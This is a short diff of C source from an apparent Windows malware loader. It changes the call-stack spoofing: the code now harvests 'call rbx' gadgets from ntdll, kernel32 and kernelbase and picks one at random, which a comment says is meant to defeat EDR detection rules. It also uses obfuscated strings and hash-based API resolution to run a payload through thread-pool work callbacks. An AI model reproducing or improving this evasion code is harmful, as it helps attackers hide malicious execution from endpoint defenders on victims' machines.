@@ -235,16 +235,20 @@ int Main(VOID) {
     //   -> RtlUserThreadStart  (ntdll)
     // ============================================================
 
-    // Find call gadget in ntdll for stack frame injection
-    BYTE xNtdll[] = XSTR_NTDLL_DLL;
-    DEOBF(xNtdll);
-    PVOID pNtdll = (PVOID)WinApis.pGetModuleHandleA((LPCSTR)xNtdll);
-    PVOID pCallGadget = NULL;
-    if (pNtdll)
-        pCallGadget = FindCallGadget(pNtdll);
+    // Harvest `call rbx` gadgets across ntdll / kernel32 / kernelbase,
+    // then pick one per-run via RDTSC. Using a pool instead of a fixed
+    // single ntdll gadget defeats EDR rules that flag high-frequency
+    // identical return addresses in the injected stack frame.
+    CollectCallGadgets();
+    PVOID pCallGadget = GetRandomCallGadget();
 
     // Store target + gadget for the ASM callback wrapper
     SetSpoofTarget(pExec, pCallGadget);
+
+    // pNtdll needed below for TpAllocWork/TpPostWork resolution
+    BYTE xNtdll[] = XSTR_NTDLL_DLL;
+    DEOBF(xNtdll);
+    PVOID pNtdll = (PVOID)WinApis.pGetModuleHandleA((LPCSTR)xNtdll);
 
     // Resolve thread pool functions from ntdll (hash-based)
     fnTpAllocWork  pTpAllocWork  = (fnTpAllocWork)FetchExportAddress(pNtdll, TpAllocWork_JOAAT);
